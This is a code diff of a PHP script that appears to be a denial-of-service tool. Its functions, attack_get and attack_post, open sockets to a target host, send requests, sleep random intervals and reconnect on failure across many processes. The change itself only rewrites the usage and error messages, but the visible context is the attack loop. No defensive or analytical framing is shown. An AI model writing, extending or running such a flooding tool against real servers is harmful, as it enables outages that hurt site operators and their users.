@@ -8,7 +8,7 @@ const ARGUMENT_PORT = 4;
 
 function print_usage($argv)
 {
-    print "Usage: ./{$argv[0]} <get or post> <number of processes> <server> [host]\n";
+    print "Usage: ./{$argv[0]} <get or post> <number of processes> <host> [port]\n";
     die();
 }
 
@@ -28,7 +28,10 @@ function attack_get($host, $port): void
             echo ".";
             sleep(rand(0, 15));
         } else {
-            echo "\nGet attack failed to sent...\n";
+            echo $errstr;
+            echo sprintf("-%s:%s\n", $host, $port);
+
+            echo "Get failed\n";
             $sockfd = @fsockopen($host, 80, $errno, $errstr);
             @fwrite($sockfd, $request);
         }
@@ -52,7 +55,7 @@ function attack_post($host, $port): void
             echo ".";
             sleep(rand(0, 15));
         } else {
-            echo "\nPost attack failed to sent...\n";
+            echo "Post failed\n";
             $sockfd = @fsockopen($host, 80, $errno, $errstr);
             @fwrite($sockfd, $request);
         }
